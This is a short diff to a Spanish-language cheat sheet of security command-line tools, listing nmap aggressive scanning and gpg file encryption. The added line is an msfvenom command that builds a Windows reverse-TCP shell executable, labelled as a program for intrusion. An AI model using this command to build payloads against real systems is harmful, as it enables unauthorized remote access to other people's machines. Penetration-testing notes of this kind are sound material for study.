@@ -10,3 +10,5 @@
 ++ nmap -A <dirección> ---> Realiza un escaneo agresivo, detectando servicios, versiones y sistema operativo 
 
 ++ gpg -c <file> ---> Cifrar archivos 
+
+++ msfvenom -p /windows/shell/reverse_tcp LHOST=<ip_local> LPORT=4444 -f exe > <nombre_programa>  ---> crear programa intrusion
